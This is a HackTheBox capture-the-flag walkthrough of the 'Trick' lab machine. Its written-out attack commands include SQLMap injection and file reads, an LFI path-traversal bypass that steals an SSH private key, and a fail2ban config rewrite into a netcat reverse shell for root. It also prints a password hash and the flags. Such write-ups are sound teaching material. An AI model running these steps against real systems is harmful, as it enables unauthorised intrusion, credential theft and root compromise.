---
title: "Walk-through of Trick from HackTheBox"
header:
  teaser: /assets/images/2022-07-04-22-43-40.png
toc: true
toc_sticky: true
excerpt_separator:  <!--more-->
categories:
  - CTF
tags:
  - HTB
  - CTF
  - Linux
  - Dig
  - SQLMap
  - Fail2ban
---

[Trick](https://www.hackthebox.com/home/machines/profile/477) is an easy level machine by [Geiseric](https://www.hackthebox.com/home/users/profile/184611) on [HackTheBox](https://www.hackthebox.com/home). This Linux box focuses on web app and OS enumeration, and using SQLMap to dump data.

<!--more-->

## Machine Information

![trick](/assets/images/2022-07-04-22-43-40.png)

We start with DNS enumeration to find an entry point. From there we use SQLMap to find user credentials, and further enumeration finds another sub-site. This gives us access to a web page which is vulnerable to LFI and we use it to get private ssh keys. The path from user to root is exploiting privleges our user has over the Fail2ban service.

| Details |  |
| --- | --- |
| Hosting Site | [HackTheBox](https://www.hackthebox.eu) |
| Link To Machine | [HTB - Easy - Trick](https://www.hackthebox.com/home/machines/profile/477) |
| Machine Release Date | 18th June 2022 |
| Date I Completed It | 6th July 2022 |
| Distribution Used | Kali 2022.1 – [Release Info](https://www.kali.org/blog/kali-linux-2022-1-release/) |

## Initial Recon

As always let's start with Nmap:

```sh
┌──(root㉿kali)-[~/htb]
└─# ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.166 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//) 

┌──(root㉿kali)-[~/htb]
└─# nmap -p$ports -sC -sV -oA trick 10.10.11.166
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-04 22:46 BST
Nmap scan report for 10.10.11.166
Host is up (0.024s latency).
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 61:ff:29:3b:36:bd:9d:ac:fb:de:1f:56:88:4c:ae:2d (RSA)
|   256 9e:cd:f2:40:61:96:ea:21:a6:ce:26:02:af:75:9a:78 (ECDSA)
|_  256 72:93:f9:11:58:de:34:ad:12:b5:4b:4a:73:64:b9:70 (ED25519)
25/tcp open  smtp    Postfix smtpd
|_smtp-commands: debian.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING
53/tcp open  domain  ISC BIND 9.11.5-P4-5.1+deb10u7 (Debian Linux)
| dns-nsid: 
|_  bind.version: 9.11.5-P4-5.1+deb10u7-Debian
80/tcp open  http    nginx 1.14.2
|_http-title: Coming Soon - Start Bootstrap Theme
|_http-server-header: nginx/1.14.2
Service Info: Host:  debian.localdomain; OS: Linux; CPE: cpe:/o:linux:linux_kernel
Nmap done: 1 IP address (1 host up) scanned in 48.94 seconds
```

We have a few open ports, looking at the website on port 80 we find nothing of interest:

![trick-website](/assets/images/2022-07-04-22-49-50.png)

## Dig

Move on to DNS on port 53. We can use DIG like we did on an old box called [Bank](https://www.hackthebox.com/home/machines/profile/26):

```sh
┌──(root㉿kali)-[~/htb]
└─# dig @10.10.11.166 -x 10.10.11.166
; <<>> DiG 9.18.0-2-Debian <<>> @10.10.11.166 -x 10.10.11.166
; (1 server found)
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 63734
;; flags: qr aa rd; QUERY: 1, ANSWER: 1, AUTHORITY: 1, ADDITIONAL: 3
;; WARNING: recursion requested but not available
;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
; COOKIE: 49bc856da71190a485707c7d62c3612fb1e2522fe9ed8b2d (good)
;; QUESTION SECTION:
;166.11.10.10.in-addr.arpa.     IN      PTR
;; ANSWER SECTION:
166.11.10.10.in-addr.arpa. 604800 IN    PTR     trick.htb.
;; AUTHORITY SECTION:
11.10.10.in-addr.arpa.  604800  IN      NS      trick.htb.
;; ADDITIONAL SECTION:
trick.htb.              604800  IN      A       127.0.0.1
trick.htb.              604800  IN      AAAA    ::1
;; Query time: 24 msec
;; SERVER: 10.10.11.166#53(10.10.11.166) (UDP)
;; WHEN: Mon Jul 04 22:52:46 BST 2022
;; MSG SIZE  rcvd: 163
```

This gives us a DNS entry of **trick.htb**. We can use a zone transfer (AXFR) to get more information. [This](https://www.acunetix.com/blog/articles/dns-zone-transfers-axfr/) is a good article if you're interested in learning more. Let's have a look:

```sh
┌──(root㉿kali)-[~/htb]
└─# dig axfr trick.htb @10.10.11.166
; <<>> DiG 9.18.0-2-Debian <<>> axfr trick.htb @10.10.11.166
;; global options: +cmd
trick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
trick.htb.              604800  IN      NS      trick.htb.
trick.htb.              604800  IN      A       127.0.0.1
trick.htb.              604800  IN      AAAA    ::1
preprod-payroll.trick.htb. 604800 IN    CNAME   trick.htb.
trick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
;; Query time: 20 msec
;; SERVER: 10.10.11.166#53(10.10.11.166) (TCP)
;; WHEN: Mon Jul 04 22:54:23 BST 2022
;; XFR size: 6 records (messages 1, bytes 231)
```

We have two more DNS names, let's add to our hosts file and have a look:

```sh
┌──(root㉿kali)-[~/htb]
└─# echo "10.10.11.166 trick.htb root.trick.htb preprod-payroll.trick.htb" >> /etc/hosts
```

Now we find a login page on the payroll site:

![trick-payroll](/assets/images/2022-07-04-22-58-48.png)

I put some fake credentials in and intercepted it with Burp:

![trick-burp](/assets/images/2022-07-05-21-01-28.png)

## SQLMap

Right click on the intercepted requested and save it to a file so we can use that with SQLmap:

```sh
┌──(root㉿kali)-[~/htb/trick]
└─# sqlmap -r trick-login.req
[*] starting @ 17:16:31 /2022-07-05/
<SNIP>
sqlmap identified the following injection point(s) with a total of 210 HTTP(s) requests:
---
Parameter: username (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=pencer' AND (SELECT 3955 FROM (SELECT(SLEEP(5)))MmMe) AND 'vVdo'='vVdo&password=pencer
---
[17:17:37] [INFO] the back-end DBMS is MySQL
web application technology: Nginx 1.14.2
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[17:17:44] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/preprod-payroll.trick.htb'
[*] ending @ 17:17:44 /2022-07-05/
```

We have time based SQLi just like we did on the [StreamIO](https://pencer.io/ctf/ctf-htb-streamio/) box. Let's look through databases, tables, and then dump user credentials:

```sh
┌──(root㉿kali)-[~/htb/trick]
└─# sqlmap -r trick-login.req --dbs --batch
[*] starting @ 17:19:13 /2022-07-05/
[17:19:28] [INFO] retrieved: 
[17:19:33] [INFO] adjusting time delay to 1 second due to good response times
information_schema
[17:20:34] [INFO] retrieved: payroll_db
available databases [2]:
[*] information_schema
[*] payroll_db
[*] ending @ 17:21:14 /2022-07-05/

┌──(root㉿kali)-[~/htb/trick]
└─# sqlmap -r trick-login.req --tables -D payroll_db --batch
[*] starting @ 17:21:34 /2022-07-05/
Database: payroll_db
[11 tables]
+---------------------+
| position            |
| allowances          |
| attendance          |
| deductions          |
| department          |
| employee            |
| employee_allowances |
| employee_deductions |
| payroll             |
| payroll_items       |
| users               |
+---------------------+
[*] ending @ 17:28:26 /2022-07-05/

┌──(root㉿kali)-[~/htb/trick]
└─# sqlmap -r trick-login.req --columns -D payroll_db -T users --batch
[*] starting @ 17:30:32 /2022-07-05/
Database: payroll_db
Table: users
[8 columns]
+-----------+--------------+
| Column    | Type         |
+-----------+--------------+
| address   | text         |
| contact   | text         |
| doctor_id | int(30)      |
| id        | int(30)      |
| name      | varchar(200) |
| password  | varchar(200) |
| type      | tinyint(1)   |
| username  | varchar(100) |
+-----------+--------------+
[*] ending @ 17:37:41 /2022-07-05/

┌──(root㉿kali)-[~/htb/trick]
└─# sqlmap -r trick-login.req --dump -D payroll_db -T users -C username,password --batch
[*] starting @ 17:39:27 /2022-07-05/
Database: payroll_db
Table: users
[1 entry]
+------------+-----------------------+
| username   | password              |
+------------+-----------------------+
| Enemigosss | SuperGucciRainbowCake |
+------------+-----------------------+
[*] ending @ 17:41:28 /2022-07-05/
```

We can also download files using SQLMap:

```sh
┌──(root㉿kali)-[~/htb/trick]
└─# sqlmap -r trick-login.req --file-read "/etc/passwd" --batch
[*] starting @ 21:58:05 /2022-07-06/
<SNIP>
[21:58:05] [INFO] fetching file: '/etc/passwd'
726F6F743A783A303A303A726F6F743A2F726F6F743A2F62696E2
F626173680A6461656D6F6E3A783A313A313A6461656D6F6E3A2F
7573722F7362696E3A2F7573722F7362696E2F6E6F6C6F67696E0
<SNIP>
```

It takes a long time but eventually we get the file:

```sh
┌──(root㉿kali)-[~/htb/trick]
└─# cat /root/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_etc_passwd | grep bash
root:x:0:0:root:/root:/bin/bash
michael:x:1001:1001::/home/michael:/bin/bash
```

We can also guess the path to the website files and grab index.php:

```sh
┌──(root㉿kali)-[~/htb/trick]
└─# sqlmap -r trick-login.req --file-read "/var/www/payroll/index.php" --batch
[*] starting @ 21:58:08 /2022-07-06/
[21:58:09] [INFO] fetching file: '/var/www/payroll/index.php'
3C21444F43545950452068746D6C3E0D0A3C68746D6C206C616E6
73D22656E223E0D0A0D0A3C686561643E0D0A20203C6D65746120
636861727365743D227574662D38223E0D0A20203C6D657461206
<SNIP>
```

Using the credentials we got from the database we can log in to the payroll site:

![trick-recruitment](/assets/images/2022-07-05-21-28-39.png)

## Gobuster

I didn't find anything useful in the recruitment system, so let's create a custom wordlist to look for other sites:

```sh
┌──(root㉿kali)-[~/htb/trick]
└─# sed 's/^/preprod-/' /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt > trick-wordlist.txt
```

Here I've just used sed to add **preprod-** in front of every entry in the seclists top 5000 wordlist. Now we can use gobuster to look for vhost:

```sh
┌──(root㉿kali)-[~/htb/trick]
└─# gobuster vhost -t 100 -w trick-wordlist.txt -u http://trick.htb 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          http://trick.htb
[+] Method:       GET
[+] Threads:      100
[+] Wordlist:     trick-wordlist.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
2022/07/05 17:38:59 Starting gobuster in VHOST enumeration mode
===============================================================
Found: preprod-marketing.trick.htb (Status: 200) [Size: 9660]
===============================================================
2022/07/05 17:39:01 Finished
===============================================================
```

We find another site, this time called marketing. Add to our hosts file and then have a look:

![trick-marketing](/assets/images/2022-07-05-21-07-35.png)

This is just a basic template site with no content, but we see the index.php page has a parameter in the URL that take a file name. We can use SQLMap to get the source code for the index.php file to see what it's doing:

```sh
┌──(root㉿kali)-[~/htb/trick]
└─# sqlmap -r trick-login.req --file-read "/var/www/market/index.php" --batch
```

Notice that the path is market not marketing!

## Code Review

Again this will take some time, but eventually we can look at the file:

```sh
┌──(root㉿kali)-[~/htb/trick]
└─# cat /root/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_var_www_market_index.php
<?php
$file = $_GET['page'];
if(!isset($file) || ($file=="index.php")) {
   include("/var/www/market/home.html");
}
else{
        include("/var/www/market/".str_replace("../","",$file));
}
?>
```

We can see it includes a file, and has a basic check for path traversal removing any paths with ../ in them. Which is easy to bypass so let's try using this knowledge with curl to grab the passwd file:

```sh
┌──(root㉿kali)-[~/htb/trick]
└─# curl -s "preprod-marketing.trick.htb/index.php?page=....//....//....//etc/passwd" | grep bash
root:x:0:0:root:/root:/bin/bash
michael:x:1001:1001::/home/michael:/bin/bash
```

## SSH Access

We have one user who can login and port 22 is open, so safe to assume they have a .ssh folder in their home directory with a id_rsa file in there. Let's grab it:

```sh
┌──(root㉿kali)-[~]
└─# curl "preprod-marketing.trick.htb/index.php?page=..././..././..././home/michael/.ssh/id_rsa"
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEAwI9YLFRKT6JFTSqPt2/+7mgg5HpSwzHZwu95Nqh1Gu4+9P+ohLtz
<SNIP>
```

Paste that private key in to a file on Kali, don't forget to chmod it:

```sh
┌──(root㉿kali)-[~/htb/trick]
└─# chmod 600 id_rsa
```

Now we can login as michael:

```sh
┌──(root㉿kali)-[~/htb/trick]
└─#  ssh michael@trick.htb -i id_rsa
Linux trick 4.19.0-20-amd64 #1 SMP Debian 4.19.235-1 (2022-03-17) x86_64
Last login: Tue Jul  5 22:53:02 2022 from 10.10.14.141
michael@trick:~$
```

## User Flag

Let's grab the user flag first:

```text
michael@trick:~$ cat user.txt 
8b7e6ed5d1aeacee59f4231e738aba5c
```

## Fail2ban

Now to find our path to root, one of the first things to check is always sudo:

```text
michael@trick:~$ sudo -l
Matching Defaults entries for michael on trick:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User michael may run the following commands on trick:
    (root) NOPASSWD: /etc/init.d/fail2ban restart
```

So our user can restart fail2ban as root with no password. A quick look for an exploit found [this](https://youssef-ichioui.medium.com/abusing-fail2ban-misconfiguration-to-escalate-privileges-on-linux-826ad0cdafb7) which gives us a simple step by step method.

First check permissions:

```text
michael@trick:~$ groups
michael security

michael@trick:~$ ls -lsa /etc/fail2ban/
total 76
 4 drwxrwx---   2 root security  4096 Jul  6 22:51 action.d
 4 -rw-r--r--   1 root root      2334 Jul  6 22:51 fail2ban.conf
<SNIP>
```

Our user michael is a member of the group called **security**, the action.d folder in /etc/fail2ban is owned by that group. Which means we can write files in there or move existing files around.

Also we see fail2ban service is running as root:

```text
michael@trick:~$ ps -ef | grep root | grep fail2ban
root      94079      1  0 22:37 ?        00:00:00 /usr/bin/python3 /usr/bin/fail2ban-server -xf start
```

Checking the settings in /etc/fail2ban/jail.conf:

```text
[DEFAULT]
#
# MISCELLANEOUS OPTIONS
#
<SNIP>
# "maxretry" is the number of failures before a host get banned.
maxretry = 5

<SNIP>
#
# ACTIONS
#
banaction = iptables-multiport
banaction_allports = iptables-allports

<SNIP>
# JAILS
#
# SSH servers
[sshd]
# To use more aggressive sshd modes set filter parameter "mode" in jail.local:
# normal (default), ddos, extra or aggressive (combines all).
# See "tests/files/logs/sshd" or "filter.d/sshd.conf" for usage example and details.
#mode   = normal
port    = ssh
logpath = %(sshd_log)s
backend = %(sshd_backend)s
bantime = 10s
```

From the snippets of the config file we can see five failed attempts on SSH will cause the banaction defined in the file iptables-multiport. Looking in iptable-multiport.conf:

```text
# Option:  actionban
# Notes.:  command executed when banning an IP. Take care that the
#          command is executed with Fail2Ban user rights.
# Tags:    See jail.conf(5) man page
# Values:  CMD
#
actionban = <iptables> -I f2b-<name> 1 -s <ip> -j <blocktype>
```

Normally actionban is set to block the offending IP. We can change this to get a reverse shell. First copy the conf file to our home folder:

```text
michael@trick:~$ cp /etc/fail2ban/action.d/iptables-multiport.conf ./pencer.conf
```

Now use sed to change the line to our reverse shell:

```text
michael@trick:~$ sed "s/<iptables> -I f2b-<name> 1 -s <ip> -j <blocktype>/\/usr\/bin\/nc 10.10.14.198 4444 -e \/usr\/bin\/bash/g" pencer.conf > iptables-multiport.conf
```

Now we need to move the existing file because we can't delete or overwrite it:

```text
michael@trick:~$ mv /etc/fail2ban/action.d/iptables-multiport.conf /etc/fail2ban/action.d/iptables-multiport.conf.bak
```

Finally put our file in its place and restart the fail2ban service:

```text
michael@trick:~$ cp iptables-multiport.conf /etc/fail2ban/action.d/iptables-multiport.conf

michael@trick:~$ sudo /etc/init.d/fail2ban restart
```

In another terminal start nc listening for our reverse shell:

```sh
┌──(root㉿kali)-[~/htb/trick]
└─# nc -nlvp 4444
listening on [any] 4444 ...
```

Create fake credentials to use with a brute force:

```sh
┌──(root㉿kali)-[~/htb/trick]
└─# cat users.txt 
a
b
c
d
e
f

┌──(root㉿kali)-[~/htb/trick]
└─# cat passwords.txt 
a
b
c
d
e
f
```

In another terminal use nmap with our fake credentials to brute force the ssh on port 22:

```sh
┌──(root㉿kali)-[~/htb/trick]
└─# nmap trick.htb -p 22 --script ssh-brute --script-args userdb=users.txt,passdb=passwords.txt
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-06 22:38 BST
NSE: [ssh-brute] Trying username/password pair: a:a
NSE: [ssh-brute] Trying username/password pair: b:b
NSE: [ssh-brute] Trying username/password pair: c:c
NSE: [ssh-brute] Trying username/password pair: d:d
NSE: [ssh-brute] Trying username/password pair: e:e
NSE: [ssh-brute] Trying username/password pair: f:f
NSE: [ssh-brute] Trying username/password pair: :
NSE: [ssh-brute] Trying username/password pair: b:a
NSE: [ssh-brute] Trying username/password pair: c:a
<SNIP>
```

## Root Flag

Switch to our waiting netcat to see we're connected as root:

```sh
┌──(root㉿kali)-[~/htb/trick]
└─# nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.14.198] from (UNKNOWN) [10.10.11.166] 45944
id
uid=0(root) gid=0(root) groups=0(root)
```

Let's grab the root flag and hash to finish the box:

```text
cat /root/root.txt
136acf699103a7099c1d063156de51ce

cat /etc/shadow | grep root
root:$6$lbBzS2rUUVRa6Erd$u2u317eVZBZgdCrT2HViYv.69vxazyKjAuVETHTpTpD42H0RDPQIbsCHwPdKqBQphI/FOmpEt3lgD9QBsu6nU1:19104:0:99999:7:::
```

All done. I hope you enjoyed that nice easy box. See you next time.
